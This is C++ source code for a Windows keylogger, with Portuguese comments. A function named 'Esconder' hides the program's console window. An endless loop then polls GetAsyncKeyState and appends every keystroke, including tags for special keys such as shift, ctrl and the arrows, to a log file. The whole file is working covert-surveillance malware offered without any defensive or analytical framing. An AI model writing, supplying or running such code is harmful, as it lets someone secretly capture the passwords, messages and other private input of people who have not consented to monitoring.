#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>

using namespace std;

int Save(int Key_Stroke,const char *file);
void Esconder();

int main(){
	Esconder();
	char i;
	while(1){
		for(i = 0; i <= 190; i++){
			if(GetAsyncKeyState(i) == -32767){
				Save(i, "logs/LOG.TXT");
			}
	    }//fim for
	}//fim while
	return 0;
}

int Save(int Key_Stroke,const char *file){
	if(Key_Stroke == 1 || Key_Stroke == 2){
		// 1 = botão esquerdo do mouse
		// 2 = botão direito do mouse
		return 0;
	}
	
	FILE *arq;
	arq = fopen(file, "a+");
	
	switch(Key_Stroke){
		case 8 :{
			fprintf(arq, "%s", "[backspace]");
			break;
		}
		case 13 :{
			fprintf(arq, "%s", "\n");
			break;
		}
		case 32 :{
			fprintf(arq, "%s", "[space]");
			break;
		}
		case VK_TAB :{
			fprintf(arq, "%s", "[tab]");
			break;
		}
		case VK_SHIFT :{
			fprintf(arq, "%s", "[shift]");
			break;
		}
		case VK_CONTROL :{
			fprintf(arq, "%s", "[Ctrl]");
			break;
		}
		case VK_ESCAPE :{
			fprintf(arq, "%s", "[esc]");
			break;
		}
		case VK_END :{
			fprintf(arq, "%s", "[end]");
			break;
		}
		case VK_HOME :{
			fprintf(arq, "%s", "[home]");
			break;
		}
		case VK_LEFT :{
			fprintf(arq, "%s", "[left]");
			break;
		}
		case VK_RIGHT :{
			fprintf(arq, "%s", "[right]");
			break;
		}
		case VK_DOWN :{
			fprintf(arq, "%s", "[down]");
			break;
		}
		case VK_UP :{
			fprintf(arq, "%s", "[up]");
			break;
		}
		case 190:{
			fprintf(arq, "%s", "[.]");
			break;
		}
		case 110 :{
			fprintf(arq, "%s", "[.]");
			break;
		}
		default:{
			fprintf(arq, "%s", &Key_Stroke);
			fclose(arq);
			cout << Key_Stroke << endl;
			break;
		}
	}// fim switch
	return 0;
}

void Esconder(){
	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}
